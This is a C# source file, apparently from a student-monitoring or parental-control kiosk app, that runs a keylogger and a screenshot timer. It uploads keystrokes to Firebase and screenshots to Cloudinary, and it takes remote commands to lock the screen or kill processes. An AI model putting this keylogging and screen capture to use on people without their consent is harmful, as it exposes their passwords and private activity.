using LearnSpace.Core.Win32;
using LearnSpace.Core.Services;
using LearnSpace.Core.Models;
using System;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;

namespace LearnSpace.Services
{
    public class BackgroundMonitorService
    {
        private readonly ScreenshotService _screenshotService;
        private readonly WindowMonitorService _windowMonitor;
        private readonly KeyloggerService _keylogger;
        private readonly FirebaseService _firebaseService;
        private readonly string _deviceToken;

        private System.Timers.Timer _screenshotTimer;
        private System.Timers.Timer _windowTimer;

        // Lưu trạng thái cấu hình
        private int _screenshotIntervalMinutes = 1; 

        public BackgroundMonitorService(string deviceToken)
        {
            _deviceToken = deviceToken;
            _screenshotService = new ScreenshotService();
            _windowMonitor = new WindowMonitorService();
            _keylogger = new KeyloggerService();
            _firebaseService = new FirebaseService();
        }

        public async void Start()
        {
            // Quét danh sách ứng dụng và đẩy lên Firebase
            var appScanner = new AppScannerService();
            var localApps = appScanner.ScanApps();
            await _firebaseService.SyncInstalledAppsAsync(_deviceToken, localApps);

            // Cập nhật Allowed Apps từ Firebase
            _firebaseService.ListenToApps(_deviceToken, apps =>
            {
                // Lưu danh sách App hợp lệ vào tĩnh hoặc biến để Kiosk dùng
                // (Tôi sẽ tạo một static property trong KioskWindow để dễ truy cập)
                Views.KioskWindow.AllowedApps = apps.FindAll(a => a.IsAllowed);
            });

            // Lắng nghe lệnh từ Firebase
            _firebaseService.ListenForCommands(_deviceToken, OnCommandReceived);

            // Lắng nghe cập nhật mã PIN động
            _firebaseService.ListenToSecurityCodes(_deviceToken, codes =>
            {
                var registryService = new Core.Win32.RegistryService();
                registryService.SaveSecurityCodes(codes.ExitCode, codes.UnlockCode);
            });

            // Bắt đầu Keylogger
            _keylogger.Start();

            // Timer cho Screenshot
            _screenshotTimer = new System.Timers.Timer(_screenshotIntervalMinutes * 60 * 1000);
            _screenshotTimer.Elapsed += async (s, e) => await CaptureAndUploadScreenshot();
            _screenshotTimer.Start();

            // Timer cho Window Monitoring (5s/lần)
            _windowTimer = new System.Timers.Timer(5000);
            _windowTimer.Elapsed += TrackWindowAndKeys;
            _windowTimer.Start();
        }

        private void OnCommandReceived(RemoteCommand command)
        {
            System.Windows.Application.Current.Dispatcher.Invoke(() =>
            {
                if (command.Action == "lock_screen" || command.Action == "lock_study")
                {
                    // Đóng tất cả Kiosk cũ nếu có
                    foreach (System.Windows.Window w in System.Windows.Application.Current.Windows)
                    {
                        if (w is Views.KioskWindow oldKiosk)
                        {
                            oldKiosk.IsForceLocked = false;
                            oldKiosk.Close();
                        }
                    }

                    // Mở Kiosk mới
                    var kiosk = new Views.KioskWindow();
                    _keylogger.IsKioskMode = true;
                    
                    // Tự động tắt IsKioskMode khi cửa sổ Kiosk bị đóng (ví dụ: mở khóa bằng mã cục bộ)
                    kiosk.Closed += (s, e) => 
                    {
                        _keylogger.IsKioskMode = false;
                    };

                    if (command.Action == "lock_screen")
                    {
                        // Ẩn Menu đi nếu chỉ khóa màn hình đen
                        kiosk.MenuContainer.Visibility = System.Windows.Visibility.Collapsed;
                    }
                    else
                    {
                        // Hiển thị Menu Study
                        kiosk.MenuContainer.Visibility = System.Windows.Visibility.Visible;
                    }
                    
                    kiosk.Show();
                }
                else if (command.Action == "unlock")
                {
                    // Mở khóa toàn bộ
                    _keylogger.IsKioskMode = false;
                    foreach (System.Windows.Window w in System.Windows.Application.Current.Windows)
                    {
                        if (w is Views.KioskWindow kiosk)
                        {
                            kiosk.IsForceLocked = false;
                            kiosk.Close();
                        }
                    }
                }
                else if (command.Action == "lock_app")
                {
                    // Khóa 1 app (Giết tiến trình)
                    string appName = command.Payload?.Replace(".exe", "");
                    if (!string.IsNullOrEmpty(appName))
                    {
                        try
                        {
                            var processes = System.Diagnostics.Process.GetProcessesByName(appName);
                            foreach (var p in processes)
                            {
                                p.Kill();
                            }
                        }
                        catch { /* Bỏ qua lỗi nếu không thể giết process */ }
                    }
                }
            });
        }

        private async Task CaptureAndUploadScreenshot()
        {
            // Chụp ảnh chất lượng 75%
            byte[] image = _screenshotService.CaptureScreen(75);
            if (image != null)
            {
                string fileName = $"scr_{_deviceToken}_{DateTime.UtcNow.Ticks}.jpg";
                string url = await _screenshotService.UploadToCloudinaryAsync(image, fileName);

                if (!string.IsNullOrEmpty(url))
                {
                    // Đẩy URL lên Firebase để ManagerApp đọc được
                    await _firebaseService.SaveLiveScreenAsync(_deviceToken, url);
                }
            }
        }

        private async void TrackWindowAndKeys(object sender, ElapsedEventArgs e)
        {
            var appInfo = _windowMonitor.GetActiveWindowInfo();
            string keys = _keylogger.FlushLog();

            if (!string.IsNullOrEmpty(keys))
            {
                // Đẩy lên Firebase
                await _firebaseService.SaveKeylogAsync(_deviceToken, keys);
            }
        }
    }
}
